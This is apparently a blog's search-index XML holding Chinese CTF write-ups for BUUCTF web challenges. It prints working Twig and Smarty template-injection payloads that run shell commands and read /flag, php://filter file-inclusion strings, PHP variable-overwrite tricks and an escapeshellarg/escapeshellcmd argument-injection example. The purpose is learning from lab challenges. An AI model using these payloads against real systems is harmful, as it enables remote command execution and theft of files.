<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJDCTF20 Cookie is so stable</title>
    <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>首先注意到本题的题目是“Cookie is so stable”，说明该题应该跟cookie相关。提到cookie，一般有以下思路：</p>
<ul>
<li>利用cookie来伪装成管理员或者其他账号</li>
<li>利用cookie进行注入，比如sql注入</li>
</ul>
<p>进入环境，首先查看了源码，发现了三个文件</p>
<ol type="1">
<li><code>index.php</code></li>
<li><code>flag.php</code></li>
<li><code>hint.php</code></li>
</ol>
<p>依次进行了查看，index.php就是进入环境看到的界面；hint.php源码中有一句提示<code>Why not take a closer look at cookies?</code>；flag.php 界面有一个输入框，猜测这里输入，然后cookie就会被设置为对应的值。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091727.png" /></p>
<h1 id="解题">解题</h1>
<p>输入admin之后，还以为其他界面会发生变化，结果跟原来一样。抓包看看，发现cookie中确实多了 <code>user=admin</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091854.png" /></p>
<p>起初，我还以为是要猜admin的cookie值，就把0，1，admin，root，administrator等都试了一遍，发现没有任何变化。</p>
<p>然后我想到了sql注入，尝试了一下发现无论输入什么也没有报错，单引号、双引号，括号都无法闭合。因此，就放弃了sql注入。</p>
<p>最后的最后，想到了还有一种注入，那就是模板注入——SSTI。所以将<code>user=&#123;&#123;7*7&#125;&#125;</code>带入，发现成功被执行！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092245.png" /></p>
<p>因此，接下来就需要判断以下模板引擎是什么，根据决策树</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>此时<code>&#123;&#123;7*7&#125;&#125;</code>已经成功被执行，此时需要走绿线，尝试<code>&#123;&#123;7*'7'&#125;&#125;</code>，如果结果为<code>49</code>则是Twig，如果结果是<code>7777777</code>，则是Jinjia2。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092437.png" /></p>
<p>因此，模板引擎为Twig。</p>
<p><strong>Twig有三个版本 1.x，2.x，3.x，三者的主要区别就是<code>_self</code>作用发生了变化</strong>。因此，使用如下payload判断一下版本。可以参考一下：<a href="https://hdfzzf.icu/2022/04/05/Twig模板注入/">Twig模板注入</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092951.png" /></p>
<p>成功被执行，因此Twig版本为1.x 。</p>
<p>接下来就很简单了，使用如下payload查看根目录 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `ls /`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里需要注意的是不能直接 <code>ls /</code>，这样子只能返回一行结果，而根目录下的文件或目录有很多，我们需要知道全部以确定flag是否在。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093154.png" /></p>
<p>找到flag。接下来读取 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `cat /flag`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093236.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<p>本题考察的主要是模板注入中的Twig模板引擎，主要的难点就是<strong>区分模板引擎</strong>。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Twig SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
<h1 id="解题">解题</h1>
<p>将源码下载后查看了发现了两个 php 文件。</p>
<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
<p>接下来进行代码审计。</p>
<blockquote>
<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
</blockquote>
<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
<ol type="1">
<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
<li><code>$yds=$flag</code></li>
<li>`<code>$is=$flag</code></li>
</ol>
<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>git泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 The mystery of ip</title>
    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
<h1 id="解题">解题</h1>
<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
<p>发现是 <code>smarty</code>。</p>
<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
<p>成功get。</p>
<h1 id="总结">总结</h1>
<ul>
<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2020 Had a bad day</title>
    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，页面有两个选择</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
<p>此时打开源码发现：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
<h1 id="解题">解题</h1>
<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过代码审计知道：</p>
<ol type="1">
<li>需要传入参数 category</li>
<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
<li>我们传入的文件名不需要包含 .php</li>
</ol>
<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
<h1 id="总结">总结</h1>
<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 2018 Online Tool</title>
    <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; </span><br><span class="line">	<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p>
<p>从上面可以看出以下几点： - 以GET方式传入 <code>host</code>； - <code>host</code> 要经过 <code>escapeshellarg</code>，<code>escapeshellcmd</code> 两个函数。但是对这两个函数现在一无所知； - <code>sandbox</code> 就是路径地址； - <code>system</code> 函数说明本题应该是命令执行；</p>
<p>现在最大的问题就是第二点的两个函数的作用。</p>
<h1 id="escapeshellarg和escapeshellcmd作用">escapeshellarg和escapeshellcmd作用</h1>
<h2 id="escapeshellarg函数">escapeshellarg函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p>
<p>看解释可能不明白什么意思，接下来看一个例子。</p>
<p>脚本如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到 <code>escapeshellarg</code> 会在所有单引号前添加转义符号，变成 <code>\'</code> 然后在这两个字符外阔上单引号<code>'\''</code>。因此，上述例子中会将原来的 <code>'</code> 变成 <code>'\''</code>，然后在整个字符串外面添加单引号。回过头看 <strong>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</strong> 就很明确了。</p>
<h2 id="escapeshellcmd函数">escapeshellcmd函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者执行操作符之前进行转义。反斜线（）会在以下字符之前插入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  #  ; `  |  *  ?  ~  &lt;  &gt;  ^  (  )  [  ]  &#123;  &#125;  $  \, \x0A  \xFF</span><br></pre></td></tr></table></figure> <code>'</code>和 <code>"</code> 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<p>看一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host2</span> = escapeshellcmd(<span class="variable">$host1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br><span class="line">&#x27;\&lt;\?php phpinfo\(&#x27;\\&#x27;&#x27;x&#x27;\\&#x27;&#x27;\)\;\?\&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到它在众多符号面前都添加了转移符号 <code>\</code> 。</p>
<h2 id="两者一起用的漏洞">两者一起用的漏洞</h2>
<p>例子来源于：<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
<ol type="1">
<li>假设传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对</strong>的引号进行了转义。</li>
<li>最后执行的命令是<code>curl '172.17.0.2'\\'' -v -d a=1\'</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>'</code>没有被转义，与再后面的<code>'</code>配对成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1'</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1'</code>。</li>
</ol>
<p>总而言之：</p>
<ul>
<li>escapeshellarg
<ul>
<li>确保用户只传递一个参数（在整个外面添加单引号，使字符串成为一个整体）</li>
<li>用户不能指定更多的参数</li>
<li>用户不能执行不同的命令（一般 <code>127.0.0.1;ls</code>，在外面添加单引号使 <code>;</code> 与前后文变成整体，因此无法实现执行多条命令）</li>
</ul></li>
<li>escapeshellcmd
<ul>
<li>确保用户只执行一个命令（会在落单的引号前添加转义字符使其失去闭合前面引号的作用）</li>
<li>用户可以指定不限量的参数</li>
<li>用户不能执行不同的命令（<code>;  $  |</code> 等符号都会被添加转义字符使其失去功能，变成字符本身）</li>
</ul></li>
</ul>
<h1 id="解题">解题</h1>
<p>本题其实还涉及 nmap 的参数，nmap 可以用 <code>-oG</code> 将执行结果写入文件。</p>
